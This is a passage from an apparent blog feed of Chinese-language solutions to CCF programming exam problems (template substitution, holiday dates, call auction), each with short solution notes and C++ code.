        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ccf-201509-3">CCF-201509-3</span></h1><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/2020090515310163.GIF#pic_center" alt="下面都不会了"></p><h2><span id="rang-wo-men-xian-lai-kan-yi-xia-ti-mu">让我们先来看一下题目</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200905153125817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200905153134316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="2"></p><h3><span id="jie-ti-si-lu">解题思路</span></h3><p>1.替换的字符用map存储；<br>2.提取字符用到了substr；<br>3.替换用到了replace，find等函数；</p><h3><span id="zhu-yi-dian">注意点</span></h3><p>1.substr的第一个参数是提取字符串的首字母下标i，第二个参数是字符串长度，一般位尾减首+1，题目中next为尾+1；<br>2.find可以不加第二个参数，加了就是从第二参数下标开始找；<br>3.replace，个人感觉这个函数吊炸天。。。不多说；<br>4.getline前要用ignore或者getchar干掉换行。</p><h3><span id="dai-ma">代码</span></h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;cstring></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;map></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span>string str<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>map<span class="token operator">&lt;</span>string<span class="token punctuation">,</span>string<span class="token operator">></span> stand<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">int</span> m<span class="token punctuation">,</span>n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>m<span class="token operator">>></span>n<span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">ignore</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token function">getline</span><span class="token punctuation">(</span>cin<span class="token punctuation">,</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      string a<span class="token punctuation">,</span>b<span class="token punctuation">;</span>      cin<span class="token operator">>></span>a<span class="token punctuation">;</span>      <span class="token function">getline</span><span class="token punctuation">(</span>cin<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>      stand<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">=</span>b<span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>b<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">int</span> prev<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>next<span class="token punctuation">;</span>      <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          string temp<span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>prev<span class="token operator">=</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">"{{ "</span><span class="token punctuation">,</span>prev<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>npos<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>next<span class="token operator">=</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token string">" }}"</span><span class="token punctuation">,</span>prev<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>npos<span class="token punctuation">)</span> <span class="token keyword">break</span><span class="token punctuation">;</span>          temp<span class="token operator">=</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span>prev<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">,</span>next<span class="token operator">-</span>prev<span class="token number">-3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>prev<span class="token punctuation">,</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span>next<span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">,</span>stand<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token operator">?</span>stand<span class="token punctuation">[</span>temp<span class="token punctuation">]</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          prev<span class="token operator">+</span><span class="token operator">=</span>stand<span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token operator">?</span>stand<span class="token punctuation">[</span>temp<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      cout<span class="token operator">&lt;&lt;</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200905153710763.png#pic_center" alt="结果"></p>]]></content>
      
      
      <categories>
          
          <category> CCF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCF节日---注意当月第一天超过目标星期的情况</title>
      <link href="/2020/09/05/jieri/"/>
      <url>/2020/09/05/jieri/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ccf-201503-3">CCF-201503-3</span></h1><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200905140415545.GIF#pic_center" alt="下面都不会了"></p><h2><span id="rang-wo-men-xian-lai-kan-yi-xia-ti-mu">让我们先来看一下题目</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200905140959803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"></p><h3><span id="jie-ti-si-lu">解题思路</span></h3><p>思路很简单，算日子。。。<br>注意：<br>1.闰年的判定<br>2.输出格式<br>3.把一些代码包装成函数有利于找bug和清晰思路</p><h3><span id="dai-ma">代码</span></h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iomanip></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">isrun</span><span class="token punctuation">(</span><span class="token keyword">int</span> y<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>y<span class="token operator">%</span><span class="token number">4</span><span class="token operator">==</span><span class="token number">0</span><span class="token operator">&amp;&amp;</span>y<span class="token operator">%</span><span class="token number">100</span><span class="token operator">!=</span><span class="token number">0</span><span class="token operator">||</span>y<span class="token operator">%</span><span class="token number">400</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> month<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">int</span> year<span class="token punctuation">,</span><span class="token keyword">int</span> mon<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> day<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1850</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>year<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isrun</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> day<span class="token operator">+</span><span class="token operator">=</span><span class="token number">366</span><span class="token punctuation">;</span>      <span class="token keyword">else</span> day<span class="token operator">+</span><span class="token operator">=</span><span class="token number">365</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token function">isrun</span><span class="token punctuation">(</span>year<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>mon<span class="token number">-1</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>  day<span class="token operator">+</span><span class="token operator">=</span>month<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    day<span class="token operator">%</span><span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">;</span>    day<span class="token operator">+</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> day<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">,</span>y1<span class="token punctuation">,</span>y2<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//a--month bth c--week </span>    cin<span class="token operator">>></span>a<span class="token operator">>></span>b<span class="token operator">>></span>c<span class="token operator">>></span>y1<span class="token operator">>></span>y2<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>y1<span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>y2<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">int</span> week<span class="token punctuation">,</span>day<span class="token punctuation">;</span>      <span class="token keyword">int</span> flag<span class="token operator">=</span><span class="token function">isrun</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>      week<span class="token operator">=</span><span class="token function">init</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>week<span class="token operator">></span>c<span class="token punctuation">)</span> day<span class="token operator">=</span><span class="token number">8</span><span class="token operator">-</span>week<span class="token operator">+</span>c<span class="token operator">+</span><span class="token punctuation">(</span>b<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">;</span>      <span class="token keyword">else</span> day<span class="token operator">=</span><span class="token number">8</span><span class="token operator">-</span>week<span class="token operator">+</span>c<span class="token operator">+</span><span class="token punctuation">(</span>b<span class="token number">-2</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>day<span class="token operator">&lt;=</span>month<span class="token punctuation">[</span>flag<span class="token punctuation">]</span><span class="token punctuation">[</span>a<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>      cout<span class="token operator">&lt;&lt;</span>i<span class="token operator">&lt;&lt;</span><span class="token string">"/"</span><span class="token operator">&lt;&lt;</span><span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token function">setfill</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>a      <span class="token operator">&lt;&lt;</span><span class="token string">"/"</span><span class="token operator">&lt;&lt;</span><span class="token function">setw</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token function">setfill</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>day<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>      <span class="token keyword">else</span>      cout<span class="token operator">&lt;&lt;</span><span class="token string">"none"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200905141404523.png#pic_center" alt="结果"></p>]]></content>
      
      
      <categories>
          
          <category> CCF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日期问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCF集合竞价---STL-set&amp;&amp;STL-vector&amp;&amp;sort()</title>
      <link href="/2020/09/05/jihejingjia/"/>
      <url>/2020/09/05/jihejingjia/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ccf-201412-3">CCF-201412-3</span></h1><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200905122202667.GIF#pic_center" alt="下面都不会了"></p><h2><span id="wo-men-xian-lai-kan-yi-xia-ti-mu">我们先来看一下题目</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200905122402557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"></p><h3><span id="jie-ti-si-lu">解题思路</span></h3><p>看到题目感觉经济学知识，不会，仔细品一下，其实就是找个价钱让交易量最大，那么我们存好数据暴力就可以了。<strong>淦！</strong><br>1.存数据我们用两个vector<br>2.暴力前，我们用两个sort()进行排序，这样遇到不满足的值可以break，不用遍历所有的数据<br>3.由于可能有多个交易最大值，为了取得最大价钱，我们用自己排序的set存储价钱（可以set不会有重复项），由经济学知识可以知道，最终的结果一定sell的price—-这个不重要，全部压到set里就可以了</p><h3><span id="dai-ma">代码</span></h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iomanip></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;cstring></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;vector></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;set></span></span><span class="token macro property">#<span class="token directive keyword">define</span> ll long long</span><span class="token macro property">#<span class="token directive keyword">define</span> mm(a,b) memset(a,b,sizeof(a))</span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">struct</span> node<span class="token punctuation">{</span>    string str<span class="token punctuation">;</span>    <span class="token keyword">double</span> price<span class="token punctuation">;</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span>    <span class="token keyword">int</span> index<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">bool</span> <span class="token function">cmp1</span><span class="token punctuation">(</span>node a<span class="token punctuation">,</span>node b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> a<span class="token punctuation">.</span>price<span class="token operator">></span>b<span class="token punctuation">.</span>price<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">bool</span> <span class="token function">cmp2</span><span class="token punctuation">(</span>node a<span class="token punctuation">,</span>node b<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> a<span class="token punctuation">.</span>price<span class="token operator">&lt;</span>b<span class="token punctuation">.</span>price<span class="token punctuation">;</span><span class="token punctuation">}</span>vector<span class="token operator">&lt;</span>node<span class="token operator">></span> buy<span class="token punctuation">,</span>sell<span class="token punctuation">;</span>set<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span> money<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">;</span><span class="token keyword">int</span> flag<span class="token punctuation">[</span>maxn<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> cnt<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    node t<span class="token punctuation">;</span>    <span class="token function">mm</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>cin<span class="token operator">>></span>t<span class="token punctuation">.</span>str<span class="token punctuation">)</span><span class="token punctuation">{</span>       cnt<span class="token operator">++</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">int</span> temp<span class="token punctuation">;</span>          cin<span class="token operator">>></span>temp<span class="token punctuation">;</span>          flag<span class="token punctuation">[</span>temp<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>          cin<span class="token operator">>></span>t<span class="token punctuation">.</span>price<span class="token operator">>></span>t<span class="token punctuation">.</span>num<span class="token punctuation">;</span>          t<span class="token punctuation">.</span>index<span class="token operator">=</span>cnt<span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'b'</span><span class="token punctuation">)</span> buy<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'s'</span><span class="token punctuation">)</span> sell<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>             money<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>price<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">sort</span><span class="token punctuation">(</span>buy<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>buy<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>cmp1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sort</span><span class="token punctuation">(</span>sell<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>sell<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>cmp2<span class="token punctuation">)</span><span class="token punctuation">;</span>    ll best_num<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">double</span> best_price<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>set<span class="token operator">&lt;</span><span class="token keyword">double</span><span class="token operator">></span><span class="token operator">::</span>iterator it<span class="token operator">=</span>money<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>it<span class="token operator">!=</span>money<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>it<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      ll sell_num<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>buy_num<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>buy<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>buy<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>buy<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>price<span class="token operator">>=</span><span class="token operator">*</span>it<span class="token punctuation">)</span> buy_num<span class="token operator">+</span><span class="token operator">=</span>buy<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">;</span>          <span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>sell<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>sell<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>sell<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>price<span class="token operator">&lt;=</span><span class="token operator">*</span>it<span class="token punctuation">)</span> sell_num<span class="token operator">+</span><span class="token operator">=</span>sell<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">;</span>         <span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>buy_num<span class="token operator">></span>sell_num<span class="token punctuation">)</span> buy_num<span class="token operator">=</span>sell_num<span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>buy_num<span class="token operator">>=</span>best_num<span class="token punctuation">)</span><span class="token punctuation">{</span>          best_num<span class="token operator">=</span>buy_num<span class="token punctuation">;</span>          best_price<span class="token operator">=</span><span class="token operator">*</span>it<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>fixed<span class="token operator">&lt;&lt;</span><span class="token function">setprecision</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>best_price<span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token operator">&lt;&lt;</span>best_num<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200905141539196.png#pic_center" alt="结果"></p>]]></content>
      
      
      <categories>
          
          <category> CCF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STL-set </tag>
            
            <tag> STL-vector </tag>
            
            <tag> algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCF碰撞的小球---我的小球碰撞不反弹，你怕不怕？</title>
      <link href="/2020/09/04/pengzhuangdexiaoqiu/"/>
      <url>/2020/09/04/pengzhuangdexiaoqiu/</url>
      
